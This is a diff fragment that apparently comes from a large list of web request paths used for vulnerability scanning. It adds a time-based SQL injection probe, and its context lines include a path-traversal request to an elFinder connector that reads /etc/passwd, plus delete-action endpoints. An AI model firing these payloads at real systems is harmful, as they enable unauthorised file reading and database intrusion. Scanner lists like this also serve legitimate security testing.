@@ -9711,3 +9711,4 @@ a
 /elfinder/php/connector.minimal.php?cmd=file&target=l1_<@base64>/var/www/html/elfinder/files//..//..//..//..//..//../etc/passwd<@/base64>&download=1
 /classes/Master.php?f=delete_item
 /classes/Master.php?f=delete_supplier
+/admin/ajax/pages.php?id=(sleep(6))
